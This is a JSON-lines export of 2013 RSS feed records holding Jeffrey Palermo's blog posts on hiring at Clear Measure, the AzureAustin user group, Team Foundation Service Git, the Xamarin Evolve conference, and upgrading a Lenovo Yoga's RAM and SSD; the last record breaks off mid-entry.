{"_id":891,"_uid":891,"_dt":1373729344394,"_s":"c7c9f2bb3ea1211132b33086736fc1ba"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/SPztZJxy9cQ/","title":"Let’s build some software together.  I’m hiring senior devs","published":{"$wrap":"$date","v":1370984424000,"h":"2013-06-11T21:00:24.000Z"},"starred":false,"read":false,"content":"<p>Job listings are always difficult.  Ok, if you want to see them, you can go here.</p><p><a href=\"http://clear-measure.com/careers/\">http://clear-measure.com/careers/</a></p><p>We are gearing up another team for an exciting new software project.  Working with some industry veterans, we are building a new product for a financial-sector company.  We are coming on board as their software engineering department providing everything from the architecture, development, QA, and ongoing operations, maintenance, and support.</p><p>The technology platform is great, too.  This system is going to have some of everything: ASP.NET MVC, some SPA, some NServiceBus, some SQL Server, some BI/big data, plenty of Azure, and rock-solid SCM/continuous delivery practices built on a bed rock of test automation.</p><p>You’ll work co-located in Austin at<a href=\"http://clear-measure.com\">Clear Measure</a>headquarters in Plaza 7000, a great, class A office building with blazing-fast internet, as many computer monitors as you want, and the latest Windows 8 machines.  Ok, big company benefits, too (United Healthcare, 401k, training, etc, etc – we cover 100% health/dental/vision for employee& small premium for family)</p><p>This is one of the projects that I’ll be personally setting in motion, so let’s work on the architecture together.  Give me a comment, email at jeffrey [at clear-measure.com.  Maybe you are good where you are, but this is a competitive job market.  If you recommend& introduce me to someone I hire,<strong><font style=\"background-color: #ffff00\" size=\"3\">I will pay you $1,000!!</font></strong></p><p>Disclaimer: In Austin, US citizen</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=SPztZJxy9cQ:RCMgm9LGYJE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=SPztZJxy9cQ:RCMgm9LGYJE:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=SPztZJxy9cQ:RCMgm9LGYJE:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/SPztZJxy9cQ\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":891}}
{"k":"0000000082","o":"0000003214","v":"001"}
{"_id":892,"_uid":892,"_dt":1373729344398,"_s":"f91b05dc1ed3c9f213ae34d5f1cbeb03"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/sSD1MYrodvE/","title":"AzureAustin is a new user group–meeting June 17","published":{"$wrap":"$date","v":1370976642000,"h":"2013-06-11T18:50:42.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://azureaustin.azurewebsites.net/index.php/integrating-source-control-with-an-azure-project/\">AzureAustin</a>is a new user group that meets at the Microsoft office.  It is dedicated to the mutual benefit and learning of its members.  The group is sponsored by Microsoft,<a href=\"http://clear-measure.com\">Clear Measure</a>, Team Venti, Veeam, and many others.</p><p>Microsoft has been strengthening its Azure platform for quite a while now, and the capabilities are astonishing.  It seems like every few months, Scott Guthrie comes out with a new blog post outlining the new capabilities that have come online.</p><p><a href=\"http://azureaustin.azurewebsites.net/index.php/integrating-source-control-with-an-azure-project/\">Come to the June 17th meeting</a>where Joe Reynolds from EPS Software will discuss Integrating source control with an azure project.</p><p><a href=\"http://azureaustin.azurewebsites.net/index.php/integrating-source-control-with-an-azure-project/\">With Azure, you can integrate your online source control with your projects – allowing you to automatically deploy your CI builds to Azure. This session will demonstrate using various source control platforms – TFS, GitHub, and CodePlex, among others, and integrating them with an ASP.Net MVC application.</a> </p><p><a href=\"http://azureaustin.azurewebsites.net/wp-content/uploads/2013/06/Joseph-Reynolds.jpg\"><img alt=\"Joe Reynolds is a Senior Developer at CODE Consulting. When not working in the office, or at home, Joe can generally be found at St. Jonah Orthodox Church, or at one of the many User Groups in which he regularly participates. Recently, he accepted a board position with the North Houston .NET User’s Group and is the Chair of the IT advisory board for Lonestar College.\" src=\"http://azureaustin.azurewebsites.net/wp-content/uploads/2013/06/Joseph-Reynolds.jpg\" width=\"150\" height=\"185\" /></a></p><p>Joe Reynolds is a Senior Developer at CODE Consulting. When not working in the office, or at home, Joe can generally be found at St. Jonah Orthodox Church, or at one of the many User Groups in which he regularly participates. Recently, he accepted a board position with the North Houston .NET User’s Group and is the Chair of the IT advisory board for Lonestar College.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=sSD1MYrodvE:Esrjefd_fbk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=sSD1MYrodvE:Esrjefd_fbk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=sSD1MYrodvE:Esrjefd_fbk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/sSD1MYrodvE\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":892}}
{"k":"0000000082","o":"0000003205","v":"001"}
{"_id":893,"_uid":893,"_dt":1373729344401,"_s":"1f390f936b4b244126503259cdac78c9"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/Q10rA5Be7KE/","title":"Team Foundation Service my new default GIT repository","published":{"$wrap":"$date","v":1368560072000,"h":"2013-05-14T19:34:32.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Team-Foundation-Service-works_CB2E/image_2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Team-Foundation-Service-works_CB2E/image_thumb.png\" width=\"458\" height=\"452\" /></a>GIT works great with the new Team Foundation Service (TFSvc?).  I’m an old school Tortoise guy (SVN, Hg, GIT), but I had to laugh at the little branding touch they through in when doing a pull.</p><p>Notice the Visual Studio logo in ASCII art.  I’ve actually been using it for some time, but I hadn’t notice that until today.</p><p>The good news is that this is just GIT.  Not some Microsoft GIT build, but it’s regular old GIT hosted for me and integrated with the other TFS features like work items, story boards, etc.  All I have to have is Microsoft accounts for my team members, and it all works.  We have three systems hosted here now, both code and work tracking.  One is an HTML5 smart client, one is a C++ system including some MFC as well as driver code, and the third is an ASP.NET Web API system with NServiceBus back end.  In short, it doesn’t matter.  It’s just GIT.</p><p>I do like the work item tracking at the story level and at the task level.  And the visualization works well also.</p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Team-Foundation-Service-works_CB2E/image_4.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Team-Foundation-Service-works_CB2E/image_thumb_1.png\" width=\"612\" height=\"364\" /></a></p><p>The stories are the rows on the left, and the sticky notes are the tasks that are what needs to be done for this story to be completed.</p><p>In short, they did a good job with Team Foundation Service.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=Q10rA5Be7KE:nEkW5q4wQfs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=Q10rA5Be7KE:nEkW5q4wQfs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=Q10rA5Be7KE:nEkW5q4wQfs:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/Q10rA5Be7KE\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":893}}
{"k":"0000000082","o":"0000003152","v":"001"}
{"_id":894,"_uid":894,"_dt":1373729344404,"_s":"27c03c6e143586825c19d24e2e851234"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/1iNJJZ8L4B0/","title":"Xamarin Evolve conference brings cross-platform mobile development to the enterprise","published":{"$wrap":"$date","v":1366042998000,"h":"2013-04-15T16:23:18.000Z"},"starred":false,"read":false,"content":"<p>Today, I am here at the Xamarin Evolve worldwide developer conference.  Xamarin has employees in  many countries, and as far as I can tell, the company has flown most of its research& development department in to Austin to serve as speakers and staffers for the conference. </p><p><img style=\"float: right; display: inline\" align=\"right\" src=\"http://xamarin.com/images/tour/4platforms12.jpg\" width=\"333\" height=\"267\" />The conference has two parts, training, and lectures.  The first two days are hands-on training sessions with two tracks: fundamentals, and advanced.  Essentially, the fundamentals track appears to be full of long-time C# programmers who are new to the Xamarin tool and developing for iOS, Android, and Mac.  The advanced track are targeted topics for folks already intimately familiar with the popular mobile operating systems.</p><p>For readers not familiar with Xamarin, this company, run by Miguel de Icaza and Nat Friedman of Mono fame, produces a stand-alone IDE for development of cross-platform native mobile apps on the Mac, and a Visual Studio extension for developing these within the Visual Studio project system.</p><p>You can read more about<a href=\"http://arstechnica.com/information-technology/2013/02/xamarin-2-0-reviewed-ios-development-finally-comes-to-visual-studio/\">Xamarin here</a>. </p><p>For many years, the consumer markets have driven the mobile development technologies.  The market demanded mobile applications, and the industry used the tools available to serve those customers.  The cost of developing multiple code bases for the different platforms almost forced some enterprises to give HTML5 a look for cross-platform apps.  There are some interesting HTML5 approaches to this, but Xamarin brings the promise of native applications to the C# developer using Visual Studio.  Moreover, after researching and playing around with the product, it now appears feasible for enterprise developers to take native mobile applications in-house.  The ability to use C# and Visual Studio to target iOS, and Android as well as WP8 is a game changer.</p><p>I will continue to watch this technology closely, but this is a transformative moment.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=1iNJJZ8L4B0:qBNKh26t7S8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=1iNJJZ8L4B0:qBNKh26t7S8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=1iNJJZ8L4B0:qBNKh26t7S8:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/1iNJJZ8L4B0\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":894}}
{"k":"0000000082","o":"0000015172","v":"001"}
{"_id":895,"_uid":895,"_dt":1373729344408,"_s":"b8b349b1c5b4cc5b2373ef53cbeff5d9"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/cwhqIsZi-T0/","title":"Adding a second SSD to my Lenovo Yoga&8GB RAM","published":{"$wrap":"$date","v":1362413505000,"h":"2013-03-04T16:11:45.000Z"},"starred":false,"read":false,"content":"<p>Over the weekend, I upgraded my Lenovo Yoga ultrabook/tablet to 8GB RAM and added a second SSD hard drive.  First, I must give credit where credit is due.  I watched this great video on YouTube that demonstrated how to do it all.</p><div id=\"scid:5737277B-5D6D-4f48-ABFC-DD9C333F4C5D:3aaa7bfd-6b82-482a-aa9c-24b226497391\" class=\"wlWriterEditableSmartContent\" style=\"float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px\"><div><object width=\"448\" height=\"252\"><param name=\"movie\" value=\"http://www.youtube.com/v/At-Br20OAvg?hl=en&hd=1\"></param><embed src=\"http://www.youtube.com/v/At-Br20OAvg?hl=en&hd=1\" type=\"application/x-shockwave-flash\" width=\"448\" height=\"252\"></embed></object></div><div style=\"width:448px;clear:both;font-size:.8em\">Video demonstration of second SSD install</div></div><p>The following was my experience, and I had a bit of difficulty in a few areas.  First, in December, I purchased a Lenovo Yoga 13 from Best Buy for $999 + tax.  I looked at Amazon, and Lenovo.com, but Best Buy had them for the same price and ready to go.  The i7 machines were on back-order, so I took a chance on the Core i5.  I have not been disappointed, actually (and I run LOTS of stuff).  The base model had 4GB RAM and 128GB SSD.  This laptop is super-thin, and coming from an Apple Retina MacBook Pro, I can say with a straight face that I love this laptop way more than the Apple.  First, if you are going to run Windows (which I do), this thing does it better.  And it’s a touch screen.  And it’s a tablet convertible.  And it’s light.  And it’s thin.  And the battery lasts all day for me.</p><p>What we are going to do here is upgrade the RAM to 8GB and add a second SSD hard drive.  The parts I purchased are 1)<a href=\"http://www.amazon.com/gp/product/B0085J17UA/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B0085J17UA&linkCode=as2&tag=jeffreypalerm-20\">Crucial m4 256GB mSATA Internal Solid State Drive CT256M4SSD3</a>& 2)<a href=\"http://www.amazon.com/gp/product/B006YG8X9Y/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B006YG8X9Y&linkCode=as2&tag=jeffreypalerm-20\">Crucial Single 8GB DDR3 1600 MT/s (PC3-12800) Notebook Module, CT102464BF160B</a>.  As I write this blog post, I have both installed into the computer, and they are working great.  I bought both from Amazon, and they arrived pretty quick.</p><h2></h2><h2>Taking the keyboard off</h2><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0400.jpg\"><img title=\"IMG_0400\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0400\" align=\"left\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0400_thumb.jpg\" width=\"184\" height=\"244\" /></a></p><p>I used a razor blade to carefully pull up the top right corer of the keyboard.  There is double-stick tape under both corners, and there are small plastic catches across the top of the keyboard frame. <a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0402.jpg\"><img title=\"IMG_0402\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; margin: 0px 0px 0px 5px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0402\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0402_thumb.jpg\" width=\"244\" height=\"184\" /></a>Use something small, like a straight-head computer screw-driver to pull the top edge of the keyboard up just slightly.  Don’t pull up, just release the catches.  Then, as you see in the image to the right, you need to slide the keyboard up and toward the screen.  There are several slides that will slide in the same direction.  After you have slid the keyboard up, it will be completely released.  Watch out for the cable.</p><h2>Replacing the RAM</h2><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0403.jpg\"><img title=\"IMG_0403\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0403\" align=\"left\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0403_thumb.jpg\" width=\"244\" height=\"184\" /></a><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0404.jpg\"><img title=\"IMG_0404\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0404\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0404_thumb.jpg\" width=\"244\" height=\"184\" /></a>This is the easy part because if you have ever done it on any computer before, it’s exactly the same.  The picture on the left shows the keyboard flipped upside down.  I don’t have to detach the keyboard for the RAM upgrade.  The picture on the right shows the RAM and the SSD.  Note that the RAM is 1600 MT/s, and the SSD is a 1.8” chip mSATA drive.  This is my first time using a hard drive that is the same size as my camera’s compact flash memory chip.  It’s amazing.  Everything is now a computer chip, and the fan is now the only moving part.  Next, they will just figure out how to induce air flow, and then there will be no moving parts at all!</p><h2>Installing the second SSD</h2><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0405.jpg\"><img title=\"IMG_0405\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0405\" align=\"left\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0405_thumb.jpg\" width=\"244\" height=\"184\" /></a></p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0417.jpg\"><img title=\"IMG_0417\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0417\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0417_thumb.jpg\" width=\"244\" height=\"184\" /></a>In order to get to the slot for the second SSD (or the first), you will need to separate the top of the case from the bottom.  The first step is to remove the keyboard ribbon cable.  This is a very delicate cable.  The black catch holds the cable in place.  Use a small screwdriver to flip it up.  Then, with the tiny screwdriver, ease it away using the side tabs.  I took care not to touch anything metal.  Then, take out all the black screws on the top that hold the aluminum plate down to the motherboard.  After this step, nothing will be lose.  Turn it over and using a T5 TORX screwdriver, take out all the screws on the under-side of the computer.  I had to go to buy a T5 TORX driver because I didn’t have one.</p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0420.jpg\"><img title=\"IMG_0420\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0420\" align=\"left\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0420_thumb.jpg\" width=\"244\" height=\"184\" /></a></p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0421.jpg\"><img title=\"IMG_0421\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"IMG_0421\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/IMG_0421_thumb.jpg\" width=\"244\" height=\"184\" /></a>With all the screws out, I started at the bottom right corner and pulled the case apart.  Magnets hold this part together.  There is plastic catches along the side, so you just have to give it a tug.  Don’t separate it too far because there are two cables still connected.  These do not have to be removed to install the SSD.  Notice that the second hard drive bay is right next to the power plug.  You can’t see it in this picture, but the primary hard drive “bay” is just to the left of the photo frame. I was able to twist the frame a bit to install the new SSD.  Just like RAM, you insert it at a slight angle and make sure it is fully seated.  My mSATA drive came with two screws.  I only had to use one of them to keep it down.</p><h2>Performance</h2><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_thumb.png\" width=\"523\" height=\"341\" /></a></p><p>The Yoga has a built-in GPU, but I don’t do gaming, so I wasn’t concerned about this.  The RAM turned out to be faster than the one provided.  Here were my scores before the upgrade.</p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_4.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_thumb_1.png\" width=\"514\" height=\"178\" /></a></p><h2></h2><h2>Moving files to the new drive</h2><p>The reason I needed a new drive was because I was out of disk space.  Literally.  With Visual Studio (and add-ons), SQL Server, lots of GIT and HG repositories, I didn’t have much space left.  I was already using a 64GB SD card in the external slot for glacial-speed extra storage.  I immediately moved my Desktop, Documents, Downloads, Pictures, and Videos folders to this new drive, along with my working folder for code repositories.</p><p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_6.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_thumb_2.png\" width=\"503\" height=\"372\" /></a></p><p>As you can see, I chose the B: drive for the new guy.  I was pretty sure I would not be connecting more than one floppy disk in the future, and some older software has some hard-coded weirdness around the A: drive, so I ignore that letter.</p><p align=\"left\"><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_8.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" align=\"left\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Adding-a-second-SSD-to-my-Lenovo-Yoga_8222/image_thumb_3.png\" width=\"248\" height=\"320\" /></a>How did I move these things, you ask?  With a few clicks.  When you right click on c:\\users\\YOU\\My Documents, and go to properties, you can get here and move it.  Windows will automatically copy all your stuff. </p><p align=\"left\">This isn’t so easy with the SkyDrive and Google Drive folders.  I may have to reinstall them!  I don’t know yet.</p><p align=\"left\">Another tip on drive space is that Lenovo has a hotfix for the wonky default partitioning of the main drive.  I was able to capture 6GB storage back after running this tool that sucks free space from the recovery and driver partitions.<a href=\"http://support.lenovo.com/en_US/downloads/detail.page?DocID=DS033035\">Get it here</a>.</p><p> </p><h2>Conclusion</h2><p>I love the YOGA, and I am so impressed that it is expandable in this way.  And with USB 3.0, it is expandable externally as well.  See my previous<a href=\"http://jeffreypalermo.com/blog/what-a-windows-8-workstation-looks-like/\">post for how I have a 2 monitor desk workstation powered by the Yoga</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=cwhqIsZi-T0:VX2n90wPiQ0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=cwhqIsZi-T0:VX2n90wPiQ0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=cwhqIsZi-T0:VX2n90wPiQ0:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/cwhqIsZi-T0\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":895}}
{"k":"0000000082","o":"0000002013","v":"001"}
{"_id":896,"_uid":896,"_dt":1373729344418,"_s":"c1d74986fb02855a1f4551bd566fd998"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/F4YNsfbl4b0/","title":"Growing Clear Measure: need architects","published":{"$wrap":"$date","v":1362170119000,"h":"2013-03-01T20:35:19.000Z"},"starred":false,"read":false,"content":"<p>As many of you know, I helped start a new company at the beginning of 2013. <a href=\"http://clear-measure.com\">Clear Measure</a>is a custom software company, and we work directly with CEO/COO/President/GM types to solve business problems where custom software will be a help.  To do this, we are building the company around software architects.  If you have read my blog for a while, then you know my stance on non-coding architects (need not apply).  If you started your career as a programmer and have progressively moved closer to the business and are currently leading custom software projects and supervising or otherwise mentoring other developers, then you might be interested in taking a look at our<strong><a href=\"http://clear-measure.com/careers/\">careers page</a></strong>.</p><p>We need architects across a spectrum of skills and experience ranges.  If you have always been a continuous learner, you might fit right in here. </p><p>If this sounds interesting, I look forward to meeting you.  Please feel free to comment here or<a href=\"http://twitter.com/jeffreypalermo\">on twitter</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=F4YNsfbl4b0:2rW7B-vXsxQ:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=F4YNsfbl4b0:2rW7B-vXsxQ:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=F4YNsfbl4b0:2rW7B-vXsxQ:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/F4YNsfbl4b0\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":896}}
{"k":"0000000082","o":"0000003279","v":"001"}
{"_id":897,"_uid":897,"_dt":1373729344421,"_s":"68cdabbf058b98231af4f485284f8dd0"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/DMwn5E2Sdrk/","title":"Launching AzureAustin user group May 13, 2013","published":{"$wrap":"$date","v":1366985344000,"h":"2013-04-26T14:09:04.000Z"},"starred":false,"read":false,"content":"<p><img style=\"float: left; margin: 0px 5px 0px 0px; display: inline\" align=\"left\" src=\"http://www.katprotech.com/images/WindowsAzure.jpg\" width=\"290\" height=\"140\" />On May 13, 2013, I’m launching a new user group,<a href=\"http://azureaustin-eorg.eventbrite.com/\">AzureAustin</a>(please<a href=\"http://azureaustin-eorg.eventbrite.com/\">RSVP</a>so we can plan food accordingly).</p><p>For those who know me, you know that I led the<a href=\"http://adnug.org/\">Austin .Net User Group</a>for 5 years, that I was on the founding board of directors for<a href=\"http://www.agileaustin.org/\">AgileAustin</a>, and that I co-founded AgileATX (now known as<a href=\"https://groups.google.com/forum/#!forum/atx-code-lunch\">ATX Code Lunch</a>– and superbly facilitated by<a href=\"https://twitter.com/chadmyers\">Chad Myers</a>).  I’m launching this new group because the nature of the data center is changing rapidly, and Microsoft is one of the big 3 lending momentum behind the trend.</p><p>I also see the Microsoft technologist having a key role to play in the new DevOps world, and this group will be central in bringing together developers and technologist responsible for running critical software systems for their companies.  By coming to together, sharing successes, and discussing challenges, we can mutually sharpen each other and learn from each other.  This group is sponsored by Microsoft and will be held at the Austin Microsoft office.  In addition, each month will have a food/drink sponsor for dinner.</p><p>At 5:30, please arrive for 30 minutes of networking and getting started with the food.  The business meeting/presentation will begin at 6PM.  We will conclude at 7:30 and have final announcements and a give away drawing.</p><p>Please share this with all you know: managers, executives, developers, I/T admins, and anyone who has a hand in developing and running business software systems.  Along with Windows Azure, we will discuss all relevant topics around the technologies used to build and operate systems that can run in Windows Azure.</p><p>I look forward to seeing you there.  Please contact me if you have any questions about the group, or if you would like to volunteer to help make the group better!</p><p><font size=\"5\"><a href=\"http://azureaustin-eorg.eventbrite.com/\">And RSVP for the first meeting!</a></font></p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=DMwn5E2Sdrk:51ubFFMrOJw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=DMwn5E2Sdrk:51ubFFMrOJw:F7zBnMyn0Lo\"><img 